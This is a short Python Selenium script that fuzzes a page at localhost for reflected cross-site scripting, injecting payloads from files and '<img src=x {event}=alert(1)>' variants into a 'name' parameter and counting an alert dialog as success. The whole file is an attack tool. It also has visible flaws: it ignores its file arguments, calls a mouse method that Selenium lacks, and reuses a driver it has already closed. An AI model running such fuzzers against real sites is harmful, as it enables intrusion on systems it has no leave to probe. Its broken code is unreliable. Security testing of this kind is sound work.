from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions
from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException, InvalidSessionIdException

def load_payloads(file='payloads.txt'):
    with open('payloads.txt', 'r') as infile:
        payloads = infile.read().split('\n')

    return payloads

def load_events(file='events.txt'):
    with open('events.txt', 'r') as infile:
        payloads = infile.read().split('\n')

    return payloads

def create_driver():
  chrome_options = webdriver.ChromeOptions()
  chrome_options.add_argument('--no-sandbox')
  chrome_options.add_argument('--headless')
  chrome_options.add_argument('--disable-gpu')
  driver = webdriver.Chrome(options=chrome_options)
  return driver

def is_alert_present(driver, payload):
    url = f'http://localhost/?name={payload}'
    try:
        driver.get(url) 
    except (InvalidSessionIdException, UnboundLocalError):
        driver = create_driver()
        driver.get(url)

    try:
        driver.getMouse().mouseMove(1, 1)
        WebDriverWait(driver, 3).until(expected_conditions.alert_is_present())
        alert = driver.switch_to.alert.accept()
        # xss successful
        return True
    except TimeoutException:
        # xss failed
        print(url)
        return False
    finally:
        driver.close()

def check_xss():
    driver = create_driver()
    payloads = load_payloads()
    for payload in payloads:
        if is_alert_present(driver, payload):
            return(payload)
    return False


if __name__ == '__main__':
    # print(check_xss())
    driver = create_driver()
    for event in load_events():
        print(is_alert_present(driver, f'<img src=x {event}=alert(1)>'))